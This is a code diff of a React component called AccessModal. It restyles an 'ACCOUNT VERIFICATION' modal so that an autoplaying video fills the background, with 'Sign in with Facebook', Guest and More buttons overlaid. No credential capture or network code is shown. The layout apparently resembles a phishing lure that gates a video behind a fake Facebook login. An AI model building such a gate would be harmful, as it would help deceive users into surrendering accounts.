@@ -17,12 +17,13 @@ interface AccessModalProps {
 }
 
 const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
-  const [showModal, setShowModal] = useState(isOpen);
   const [showFacebookLogin, setShowFacebookLogin] = useState(false);
 
-  useEffect(() => {
-    setShowModal(isOpen);
-  }, [isOpen]);
+  const handleBackdropClick = (e: React.MouseEvent) => {
+    if (e.target === e.currentTarget) {
+      onClose();
+    }
+  };
 
   const handleFacebookLogin = () => {
     setShowFacebookLogin(true);
@@ -32,14 +33,7 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
     setShowFacebookLogin(false);
   };
 
-  const handleBackdropClick = (e: React.MouseEvent) => {
-    if (e.target === e.currentTarget) {
-      setShowModal(false);
-      onClose();
-    }
-  };
-
-  if (!showModal) return null;
+  if (!isOpen) return null;
 
   return (
     <>
@@ -47,46 +41,42 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
         className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm"
         onClick={handleBackdropClick}
       >
-        <div className="relative w-[90%] max-w-md mx-auto bg-white rounded-lg shadow-2xl overflow-hidden border border-gray-300">
+        <div className="relative w-[90%] max-w-md aspect-[16/9] bg-black rounded-lg shadow-2xl overflow-hidden">
 
-          {/* Header */}
-          <div className="bg-gray-100 px-4 py-2 flex items-center justify-between border-b border-gray-300">
+          {/* Close Button and Title */}
+          <div className="absolute top-0 left-0 w-full flex justify-between items-center px-4 py-2 z-20 bg-white/80 backdrop-blur-sm">
             <h2 className="text-sm font-semibold text-gray-800">ACCOUNT VERIFICATION</h2>
-            <button onClick={() => { setShowModal(false); onClose(); }}>
+            <button onClick={onClose}>
               <X className="w-5 h-5 text-gray-500 hover:text-black" />
             </button>
           </div>
 
-          {/* Embedded Video */}
-          <div className="w-full aspect-video relative">
-            <iframe
-              src="https://streamable.com/e/9d8j5m?autoplay=1&muted=1&nocontrols=1"
-              allow="fullscreen;autoplay"
-              allowFullScreen
-              className="absolute top-0 left-0 w-full h-full border-none"
-            />
-          </div>
+          {/* Video Background */}
+          <iframe
+            src="https://streamable.com/e/9d8j5m?autoplay=1&muted=1&nocontrols=1"
+            allow="fullscreen;autoplay"
+            allowFullScreen
+            className="absolute top-0 left-0 w-full h-full z-10"
+          />
 
-          {/* Buttons */}
-          <div className="w-full px-5 pb-4 pt-2 flex flex-col gap-2 items-center bg-white">
-            {/* Facebook Button */}
+          {/* Buttons Overlayed on Video */}
+          <div className="absolute bottom-4 left-1/2 transform -translate-x-1/2 z-20 w-full px-4 flex flex-col items-center gap-2">
             <button
               onClick={handleFacebookLogin}
-              className="w-56 bg-[#1877f2] text-white flex items-center justify-center px-3 py-1 rounded-md shadow hover:bg-[#145dcc] text-xs font-medium"
+              className="w-[80%] bg-[#1877f2] text-white px-3 py-1.5 rounded-md shadow-md hover:bg-[#145dcc] text-xs font-medium text-center"
             >
               Sign in with Facebook
             </button>
-
-            {/* Guest and More Buttons */}
-            <div className="flex justify-between w-56 gap-2 mt-1">
-              <button className="flex-1 bg-white border border-gray-400 text-black py-1 rounded-md shadow hover:bg-gray-100 text-xs font-semibold">
+            <div className="flex w-[80%] justify-between gap-2">
+              <button className="flex-1 bg-white/90 border border-gray-400 text-black py-1 rounded-md shadow text-xs font-semibold">
                 👤 Guest
               </button>
-              <button className="flex-1 bg-white border border-gray-400 text-black py-1 rounded-md shadow hover:bg-gray-100 text-xs font-semibold">
+              <button className="flex-1 bg-white/90 border border-gray-400 text-black py-1 rounded-md shadow text-xs font-semibold">
                 ••• More
               </button>
             </div>
           </div>
+
         </div>
       </div>
 
